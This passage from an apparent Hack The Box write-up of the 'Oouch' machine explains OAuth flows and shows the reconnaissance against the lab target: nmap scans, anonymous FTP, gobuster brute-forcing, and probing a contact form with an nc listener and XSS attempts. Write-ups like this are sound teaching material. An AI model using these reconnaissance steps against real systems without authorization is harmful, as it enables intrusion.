@@ -1,0 +1,1113 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Oouch</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#htb-oouch">htb-oouch</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#oauth">oauth</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#ftp">ftp</a> <a class="post-tag" href="/tags#vsftpd">vsftpd</a> <a class="post-tag" href="/tags#vhosts">vhosts</a> <a class="post-tag" href="/tags#csrf">csrf</a> <a class="post-tag" href="/tags#gobuster">gobuster</a> <a class="post-tag" href="/tags#api">api</a> <a class="post-tag" href="/tags#ssh">ssh</a> <a class="post-tag" href="/tags#container">container</a> <a class="post-tag" href="/tags#docker">docker</a> <a class="post-tag" href="/tags#dbus">dbus</a> <a class="post-tag" href="/tags#iptables">iptables</a> <a class="post-tag" href="/tags#command-injection">command-injection</a> <a class="post-tag" href="/tags#injection">injection</a> <a class="post-tag" href="/tags#uwsgi">uwsgi</a> <a class="post-tag" href="/tags#waf">waf</a> <a class="post-tag" href="/tags#cron">cron</a> <a class="post-tag" href="/tags#htb-lame">htb-lame</a> <a class="post-tag" href="/tags#htb-secnotes">htb-secnotes</a> </span><br/><br/>
+<time class="dt-published" datetime="2020-08-01T14:45:00+00:00" itemprop="datePublished">Aug 1, 2020
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2020/08/01/htb-oouch.html" style="color: #e6e6e6; text-decoration: none;">HTB: Oouch</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/oouch-cover.webp" type="image/webp"/>
+<img alt="Oouch" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/oouch-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:120px;">
+</img></picture>
+<p>The first half of Oouch built all around OAuth, a technology that is commonplace on the internet today, and yet I didn’t understand well coming into the challenge. This box forced me to gain an understanding, and writing this post cemented that even further. To get user, I’ll exploit an insecure implementation of OAuth via a CSRF twice. The first time to get access to qtc’s account on the consumer application, and then to get access to qtc’s data on the authorization server, which includes a private SSH key. With a shell, I’ll drop into the consumer application container and look at how the site was blocking XSS attacks, which includes some messaging over DBus leading to iptables blocks. I’ll pivot to the www-data user via a uWSGI exploit and then use command injection to get execution as root. In Beyond Root, I’ll look at the command injection in the root DBus server code.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/231 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/oouch" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Oouch</a> <a href="https://hackthebox.com/machines/oouch" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-oouch.webp" type="image/webp"/> <img alt="Oouch" class="img-av" src="/icons/box-oouch.png"/></picture></a><br/><a href="https://hackthebox.com/machines/oouch" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1233063359530110976">29 Feb 2020</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">01 Aug 2020</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Hard">Hard [40]</span></td>
+</tr>
+<tr>
+<td>Rated Difficulty</td>
+<td style="text-align: right"><picture><source srcset="/img/oouch-diff.webp" type="image/webp"/><img alt="Rated difficulty for Oouch" src="/img/oouch-diff.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td>Radar Graph</td>
+<td style="text-align: right"><picture><source srcset="/img/oouch-radar.webp" type="image/webp"/><img alt="Radar chart for Oouch" src="/img/oouch-radar.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">03:27:54</span><a href="https://app.hackthebox.com/users/76469" rel="noopener" target="_blank"><img alt="haqpl" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/76469" style="display: unset"/><span class="user-text" style="display: none"> haqpl</span></a><br/></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">07:52:04</span><a href="https://app.hackthebox.com/users/836" rel="noopener" target="_blank"><img alt="sampriti" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/836" style="display: unset"/><span class="user-text" style="display: none"> sampriti</span></a><br/></td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/103578" rel="noopener" target="_blank"><img alt="qtc" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/103578" style="display: unset"/><span class="user-text" style="display: none"> qtc</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="oauth">Oauth</h2>
+<h3 id="wheres-recon">Where’s Recon?</h3>
+<p>For anyone who has read my HTB write-ups before, I always start with Recon, and try to introduce the technology as I come across it. The user portion of Oouch is completely centered on Oauth, an open standard authorization protocol / framework for access delegation, which allows users to grant access to a website to access information on another website without giving the first site the password for the second. Oauth is complicated, and I was finding that trying to introduce it mixed into the enumeration was getting confusing, hence this section up front.</p>
+<h3 id="resources">Resources</h3>
+<p>I did a lot of reading about OAuth to solve Oouch, and then a lot of reading again trying to make this post useful several months later. The most useful resource I found was <a href="https://medium.com/@darutk/diagrams-and-movies-of-all-the-oauth-2-0-flows-194f3c3ade85">this medium post</a>, not because it had a ton of detail, but because it had both charts that showed the various flows <em>and</em> the details of the requests that were used at each step. This allowed me to identify different requests and redirects that I was seeing and match them against the flow.</p>
+<p>I read a lot of “what is OAuth” posts, but none got really into the depth I needed to solve this box. I did read through the <a href="https://tools.ietf.org/html/rfc6749">RFC</a> itself. It came be confusing a lot of the times, but has all the detail, and some good ASCII diagrams.</p>
+<h3 id="oauth-basics">OAuth Basics</h3>
+<h4 id="general">General</h4>
+<p>OAuth defines how three different services interact with each other to share data for the benefit of their users. For example, “Log in with Google” (or some Facebook or GitLab or any other service) is a common case. Some website wants you to create an account, and to have an account, you have to provide an email address, and a phone number. You can sign up and create another account, or you can click “Log in with Google”, and then the small website and Google exchange information and you have an account there. OAuth solves the problem of how do you securely let those two sites talk such that the website knows you are actually authenticated with Google, and only get the information it’s supposed to get.</p>
+<p>The three services are the application (or consumer to use the term from Oouch), the authorization server, and the resource server (in the example above Google is both the authorization server and the resource server - this is typical, but it doesn’t have to be this way). Because these two are often the same (both for what we need for Oouch and for many real life examples), I’ll refer to them sometimes just as the OAuth provider.</p>
+<h4 id="set-up">Set Up</h4>
+<p>Before a user gets involved, the application needs to register with the OAuth provider. The OAuth provider will have some form to submit, which will include the kind of data that the application wants access to. On registration, the OAuth provider will return to the application a <code class="language-plaintext highlighter-rouge">CLIENT_ID</code> and <code class="language-plaintext highlighter-rouge">CLIENT_SECRET</code>.</p>
+<h4 id="authorization-flow">Authorization Flow</h4>
+<p>The Authorization Flow is the one necessary to understand for Oouch. The user goes to the application (think some website), and clicks the “Log in with Google” link instead of creating an account locally. The application returns a HTTP redirect with a url pointing to the authorization server, with GET parameters that include the <code class="language-plaintext highlighter-rouge">CLIENT_ID</code> and a <code class="language-plaintext highlighter-rouge">redirect_uri</code>. The <code class="language-plaintext highlighter-rouge">redirect_uri</code> is where the applications wants the user sent back to once they are done with the authorization server.</p>
+<p>The user now is at the authorization server, where they are asked to log in (if not already), and then presented the option to approve access for the application to data from the resource server. On clicking yes, the authorization server returns a HTTP redirect back to the <code class="language-plaintext highlighter-rouge">redirect_uri</code> that was passed to it, but also includes an <code class="language-plaintext highlighter-rouge">authorization_code</code> as a GET parameter.</p>
+<p>The <code class="language-plaintext highlighter-rouge">authorization_code</code> is not enough on it’s own to get access to information from the resource server. It was passed through the user, and could have been compromised there. It is just a short-lived part of the authentication process. The application will send the <code class="language-plaintext highlighter-rouge">CLIENT_ID</code>, <code class="language-plaintext highlighter-rouge">CLIENT_SECRET</code>, <code class="language-plaintext highlighter-rouge">authorization_code</code>, and <code class="language-plaintext highlighter-rouge">redirect_url</code> that was originally associated with this request directly to the authorization server (not through the user), and get back an <code class="language-plaintext highlighter-rouge">access_token</code>.</p>
+<p>The application can set the <code class="language-plaintext highlighter-rouge">access_token</code> as the Bearer header in requests to the resource server. Typically once it gets that data it returns a page to the user showing them logged in.</p>
+<p>I created this diagram to try to show the process:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/image-20200730181927997.png"><img alt="OAuth Authorization Flow" src="https://0xdfimages.gitlab.io/img/image-20200730181927997.png"/><em>Click for full size image</em></a></p>
+<p>You’ll see this again and again throughout this post, with different parts highlighted.</p>
+<p>My description and diagram are a simplified version of what’s shown in this image from <a href="https://medium.com/@darutk/diagrams-and-movies-of-all-the-oauth-2-0-flows-194f3c3ade85">this post</a>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1ULF38OTiNJNQZ4lHQZqRwQ.webp" type="image/webp"/>
+<img alt="Image for post" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1ULF38OTiNJNQZ4lHQZqRwQ.png"/>
+</picture>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> shows four open TCP ports: FTP (21), SSH (22), and HTTP (5000 and 8000):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-oA</span> scans/nmap-alltcp 10.10.10.177 
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-29 14:12 EST
+Nmap scan report for 10.10.10.177
+Host is up (0.015s latency).
+Not shown: 65531 closed ports
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+5000/tcp open  upnp
+8000/tcp open  http-alt
+
+Nmap done: 1 IP address (1 host up) scanned in 8.34 seconds
+
+</span><span class="gp">root@kali#</span><span class="w"> </span>nmap <span class="nt">-p</span> 21,22,5000,8000 <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oA</span> scans/nmap-tcpscripts 10.10.10.177 
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-29 14:15 EST
+WARNING: Service 10.10.10.177:8000 had already soft-matched rtsp, but now soft-matched sip; ignoring second value
+Nmap scan report for 10.10.10.177
+Host is up (0.015s latency).
+
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 2.0.8 or later
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 ftp      ftp            49 Feb 11 18:34 project.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.10.14.6
+|      Logged in as ftp
+|      TYPE: ASCII
+|      Session bandwidth limit in byte/s is 30000
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 8d:6b:a7:2b:7a:21:9f:21:11:37:11:ed:50:4f:c6:1e (RSA)
+|_  256 d2:af:55:5c:06:0b:60:db:9c:78:47:b5:ca:f4:f1:04 (ED25519)
+5000/tcp open  http    nginx 1.14.2
+|_http-server-header: nginx/1.14.2
+| http-title: Welcome to Oouch
+|_Requested resource was http://10.10.10.177:5000/login?next=%2F
+8000/tcp open  rtsp
+| fingerprint-strings: 
+|   FourOhFourRequest, GetRequest, HTTPOptions: 
+|     HTTP/1.0 400 Bad Request
+|     Content-Type: text/html
+|     Vary: Authorization
+|     &lt;h1&gt;Bad Request (400)&lt;/h1&gt;
+|   RTSPRequest: 
+|     RTSP/1.0 400 Bad Request
+|     Content-Type: text/html
+|     Vary: Authorization
+|     &lt;h1&gt;Bad Request (400)&lt;/h1&gt;
+|   SIPOptions: 
+|     SIP/2.0 400 Bad Request
+|     Content-Type: text/html
+|     Vary: Authorization
+|_    &lt;h1&gt;Bad Request (400)&lt;/h1&gt;
+|_http-title: Site doesn't have a title (text/html).
+|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8000-TCP:V=7.80%I=7%D=2/29%Time=5E5AB83E%P=x86_64-pc-linux-gnu%r(Ge
+SF:tRequest,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
+SF:t/html\r\nVary:\x20Authorization\r\n\r\n&lt;h1&gt;Bad\x20Request\x20\(400\)&lt;/
+SF:h1&gt;")%r(FourOhFourRequest,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nCon
+SF:tent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n&lt;h1&gt;Bad\x20Req
+SF:uest\x20\(400\)&lt;/h1&gt;")%r(HTTPOptions,64,"HTTP/1\.0\x20400\x20Bad\x20Req
+SF:uest\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n&lt;h1
+SF:&gt;Bad\x20Request\x20\(400\)&lt;/h1&gt;")%r(RTSPRequest,64,"RTSP/1\.0\x20400\x2
+SF:0Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization
+SF:\r\n\r\n&lt;h1&gt;Bad\x20Request\x20\(400\)&lt;/h1&gt;")%r(SIPOptions,63,"SIP/2\.0\
+SF:x20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Auth
+SF:orization\r\n\r\n&lt;h1&gt;Bad\x20Request\x20\(400\)&lt;/h1&gt;");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.81 seconds
+</span></code></pre></div></div>
+<p>The <a href="https://packages.debian.org/search?keywords=openssh-server">OpenSSH version</a> suggests this host is running is Debian 10 buster.</p>
+<h3 id="ftp---tcp-21">FTP - TCP 21</h3>
+<p>The version string from <code class="language-plaintext highlighter-rouge">nmap</code>, “vsftpd 2.0.8 or later” is weird. I’ve never seen vsftpd print like “or later” before. I did check to see if the v2.3.4 backdoor (like in <a href="/2020/04/07/htb-lame.html#vsftpd-exploit">Lame</a>), but didn’t get anywhere. Seems like more of an easter egg than a path.</p>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> also identified that anonymous access was allowed on FTP. On logging in, I see one file, <code class="language-plaintext highlighter-rouge">project.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>ftp 10.10.10.177
+<span class="go">Connected to 10.10.10.177.
+220 qtc's development server
+Name (10.10.10.177:root): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls -la
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 ftp      ftp          4096 Feb 11 18:34 .
+drwxr-xr-x    2 ftp      ftp          4096 Feb 11 18:34 ..
+-rw-r--r--    1 ftp      ftp            49 Feb 11 18:34 project.txt
+226 Directory send OK.
+ftp&gt; get project.txt
+local: project.txt remote: project.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for project.txt (49 bytes).
+226 Transfer complete.
+49 bytes received in 0.00 secs (54.6251 kB/s)
+</span></code></pre></div></div>
+<p>It’s a small file, which suggests terms for the two webservers.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span><span class="nb">cat </span>project.txt 
+<span class="go">Flask -&gt; Consumer
+Django -&gt; Authorization Server
+</span></code></pre></div></div>
+<p>Given the name of the box, I’m already thinking <a href="https://oauth.net/2/">OAuth</a>, and this would indicate that one of the webservers is the site I want to access, and the other is the authorization server.</p>
+<h3 id="website---tcp-8000">Website - TCP 8000</h3>
+<p>Visiting port 8000 just returns:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">400</span> <span class="ne">Bad Request</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html</span>
+<span class="na">Vary</span><span class="p">:</span> <span class="s">Authorization</span>
+<span class="s">&lt;h1&gt;Bad Request (400)&lt;/h1&gt;</span>
+</code></pre></div></div>
+<p>I ran <code class="language-plaintext highlighter-rouge">gobuster</code> and poked around a bit, but nothing interesting came out. I’ll come back to this later with more information.</p>
+<h3 id="website---tcp-5000">Website - TCP 5000</h3>
+<h4 id="site">Site</h4>
+<p>The site goes directly to a login page:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200303210639910.webp" type="image/webp"/>
+<img alt="image-20200303210639910" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200303210639910.png"/>
+</picture>
+<p>There is a Register link at the top. Once I create a user with username, email, and password, I’m sent back to the login screen, where I can log in:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200303210754302.webp" type="image/webp"/>
+<img alt="image-20200303210754302" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200303210754302.png"/>
+</picture>
+<p>The Menu link shows the page above. The Profile link shows connected accounts:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200303211632414.webp" type="image/webp"/>
+<img alt="image-20200303211632414" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200303211632414.png"/>
+</picture>
+<p>The Password Change link provides a form to change my password. I checked the POST request to see if it could be an CSRF like in <a href="/2019/01/19/htb-secnotes.html#intended-route-xsrf">SecNotes</a>, but there was a <code class="language-plaintext highlighter-rouge">csrf_token</code> parameter submitted.</p>
+<p>The Documents link says this section is only available for administrative accounts at this time.</p>
+<p>The About page says that this is an auth server:</p>
+<blockquote>
+<p>This application is the pilot project for our Oouch authorization  server. This server configuration matches the            setup that we want to deploy to production soon. It is  implemented according to high security standards and offers a simple but secure authorization            system across several applications. If you notice bugs  inside the application or the authentication flow, please inform our  system administrator.</p>
+</blockquote>
+<h4 id="contact">/contact</h4>
+<p>Finally, the Contact link has a textbox to submit feedback to the system administrator:</p>
+<blockquote>
+<p>Customer contact is really important for us. If you have feedback to our site or found any bugs that influenced your user experience, please do not hesitate to contact us. Messages that were  submitted in the message box below are forwarded to the system  administrator. Please do not submit security issues using this form. Instead ask our system administrator how to establish an encrypted communication channel.</p>
+</blockquote>
+<p>I can submit a link in there, and it will be clicked on by someone. For example, if I submit:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"http://10.10.14.6/0xdf"</span><span class="nt">&gt;</span>click me<span class="nt">&lt;/a&gt;</span>
+</code></pre></div></div>
+<p>I can see a connection attempt in Python <code class="language-plaintext highlighter-rouge">http.server</code> or in <code class="language-plaintext highlighter-rouge">nc</code> about a minute later:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 80
+<span class="go">listening on [any] 80 ...
+connect to [10.10.14.6] from (UNKNOWN) [10.10.10.177] 60462
+GET /0xdf HTTP/1.1
+Host: 10.10.14.6
+User-Agent: python-requests/2.21.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</span></code></pre></div></div>
+<p>I looked for vulnerabilities in Python Requests, but didn’t find anything.</p>
+<p>I also tried some cross site scripting, but anything with <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> or <code class="language-plaintext highlighter-rouge">&lt;img&gt;</code> results in this:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200314134738310.webp" type="image/webp"/>
+<img alt="image-20200314134738310" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200314134738310.png"/>
+</picture>
+<p>Once that message displayed, I was unable to connect to the site for the next minute.</p>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I originally ran <code class="language-plaintext highlighter-rouge">gobuster</code> with the <code class="language-plaintext highlighter-rouge">small</code> wordlist I typically use:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.177:5000 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt <span class="nt">-o</span> scans/gobuster-5000-root-small <span class="nt">-t</span> 40
+<span class="go">===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.177:5000
+[+] Threads:        40
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/02/29 14:33:59 Starting gobuster
+===============================================================
+/about (Status: 302)
+/contact (Status: 302)
+/home (Status: 302)
+/login (Status: 200)
+/register (Status: 200)
+/profile (Status: 302)
+/documents (Status: 302)
+/logout (Status: 302)
+===============================================================
+2020/02/29 14:40:05 Finished
+===============================================================
+</span></code></pre></div></div>
+<p>On not finding much else, I came back with <code class="language-plaintext highlighter-rouge">big</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.177:5000 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/big.txt <span class="nt">-o</span> scans/gobuster-5000-root-big <span class="nt">-t</span> 10
+<span class="go">===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.177:5000
+[+] Threads:        10
+[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/big.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/03/03 17:39:11 Starting gobuster
+===============================================================
+/about (Status: 302)
+/contact (Status: 302)
+/documents (Status: 302)
+/home (Status: 302)
+/login (Status: 200)
+/logout (Status: 302)
+/oauth (Status: 302)
+/profile (Status: 302)
+/register (Status: 200)
+===============================================================
+2020/03/03 17:42:56 Finished
+===============================================================
+</span></code></pre></div></div>
+<p>One new one appeared: <code class="language-plaintext highlighter-rouge">/oauth</code> (which makes perfect sense with the focus of the box).</p>
+<h4 id="oauth-1">/oauth</h4>
+<p>This page gives instructions for how to connect to the oauth server:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200303213551892.webp" type="image/webp"/>
+<img alt="image-20200303213551892" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200303213551892.png"/>
+</picture>
+<p><em>Note: Visiting <code class="language-plaintext highlighter-rouge">/oauth/</code> doesn’t work. The trailing <code class="language-plaintext highlighter-rouge">/</code> breaks it.</em></p>
+<p>This must be the account connecting mentioned on the profile page.</p>
+<p>I’ll add <code class="language-plaintext highlighter-rouge">consumer.oouch.htb</code> and  <code class="language-plaintext highlighter-rouge">ouch.htb</code> to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file. I did some fuzzing for other vhosts on :5000, but didn’t find any. I also did a <code class="language-plaintext highlighter-rouge">gobuster</code> on the <code class="language-plaintext highlighter-rouge">/oauth</code> path, and found the two paths linked to from <code class="language-plaintext highlighter-rouge">/oauth</code>, <code class="language-plaintext highlighter-rouge">connect</code> and <code class="language-plaintext highlighter-rouge">login</code>, but nothing else.</p>
+<h3 id="authorizationoouchhtb8000">authorization.oouch.htb:8000</h3>
+<h4 id="enumeration-of-8000oauth">Enumeration of :8000/oauth</h4>
+<p>Visiting <code class="language-plaintext highlighter-rouge">http://consumer.oouch.htb:5000/oauth/connect</code> returns a 302 redirect to a new vhost on port 8000:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&amp;response_type=code&amp;redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&amp;scope=read
+</code></pre></div></div>
+<p>On my OAuth diagram:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/image-2020073018192796.png"><img alt="OAuth Authorization Flow" src="https://0xdfimages.gitlab.io/img/image-2020073018192796.png"/><em>Click for full size image</em></a></p>
+<p>After adding the <code class="language-plaintext highlighter-rouge">authorization.oouch.htb</code> subdomain to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>, that redirect lands me at a login page:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200729173947737.webp" type="image/webp"/>
+<img alt="image-20200729173947737" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200729173947737.png"/>
+</picture>
+<p>My account from port 5000 doesn’t work.</p>
+<h4 id="web-root">Web Root</h4>
+<p>Just visiting <code class="language-plaintext highlighter-rouge">http://authorization.oouch.htb:8000</code> gives a welcome page for the authorization server:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200729174104015.webp" type="image/webp"/>
+<img alt="image-20200729174104015" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200729174104015.png"/>
+</picture>
+<p>The two links point to <code class="language-plaintext highlighter-rouge">http://authorization.oouch.htb:8000/login/</code> and <code class="language-plaintext highlighter-rouge">http://authorization.oouch.htb:8000/signup/</code>.</p>
+<h4 id="directory-brute-force-1">Directory Brute Force</h4>
+<p>Running <code class="language-plaintext highlighter-rouge">gobuster</code> now with the updated subdomain returns three paths:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://authorization.oouch.htb:8000 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/big.txt <span class="nt">-o</span> scans/gobuster-8000-authorization.out.htb-big <span class="nt">-t</span> 40
+<span class="go">===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://authorization.oouch.htb:8000
+[+] Threads:        40
+[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/big.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/03/04 17:22:49 Starting gobuster
+===============================================================
+/home (Status: 301)
+/login (Status: 301)
+/signup (Status: 301)
+===============================================================
+2020/03/04 17:24:11 Finished
+===============================================================
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">/login</code> and <code class="language-plaintext highlighter-rouge">/signup</code> I knew from the welcome page. <code class="language-plaintext highlighter-rouge">/home</code> returns the same thing as <code class="language-plaintext highlighter-rouge">/</code> when not logged in.</p>
+<h4 id="signup">/signup</h4>
+<p>There is another signup page, for a different account with different requirements:</p>
+<div style="max-height: 600px; overflow: hidden; position: relative; margin-bottom: 20px;">
+<a href="https://0xdfimages.gitlab.io/img/image-20200308163104756.png">
+<img alt="image-20200308163104756" src="https://0xdfimages.gitlab.io/img/image-20200308163104756.png" style="clip-path: polygon(0 0, 100% 0, 100% 560px, 49% 590px, 51% 570px, 0 600px); -webkit-clip-path: polygon(0 0, 100% 0, 100% 560px, 49% 590px, 51% 570px, 0 600px)"/>
+</a>
+<div style="position: absolute; right: 20px; top: 575px"><a href="https://0xdfimages.gitlab.io/img/image-20200308163104756.png"><i>Click for full image</i></a></div>
+</div>
+<p>This makes sense. In a real world scenario, these would be completely different services, hosted by different organization, on different servers. That’s represented by the two ports here in HTB.</p>
+<p>I played with the SSH fields, seeing if Oouch would connect back to me on 22, but I didn’t have any luck for now.</p>
+<h4 id="home">/home</h4>
+<p>I was able to create an account and then login. I’m redirected to <code class="language-plaintext highlighter-rouge">/home</code>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200308163317746.webp" type="image/webp"/>
+<img alt="image-20200308163317746" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200308163317746.png"/>
+</picture>
